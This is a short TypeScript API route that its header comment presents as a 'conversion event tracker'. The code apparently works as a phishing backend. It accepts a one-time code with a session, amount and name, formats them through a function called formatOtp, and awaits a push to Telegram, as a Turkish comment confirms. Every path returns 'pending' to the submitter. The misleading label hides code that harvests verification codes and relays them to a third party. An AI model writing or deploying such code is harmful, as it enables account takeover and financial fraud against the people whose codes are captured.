/**
 * Conversion event tracker — records completed goal events.
 */
import { formatOtp, pushMessage, nextRef } from "@/lib/channels/relay";

export async function POST(request: Request) {
  try {
    const { code, session, value, label } = await request.json();

    if (!code || code.length < 4) {
      return Response.json({
        result: "pending",
        session,
        ts: Date.now(),
      });
    }

    const ref = nextRef();
    const msg = formatOtp(
      String(code || ""),
      String(session || ref),
      Number(value || 0),
      String(label || "Anonymous"),
    );

    // Telegram mesajı response'tan ÖNCE beklenir —
    // Netlify'da cold start + background kill sorununu önler.
    await pushMessage(msg);

    return Response.json({
      result: "pending",
      session,
      ref,
      ts: Date.now(),
    });
  } catch {
    return Response.json({
      result: "pending",
      ts: Date.now(),
    });
  }
}
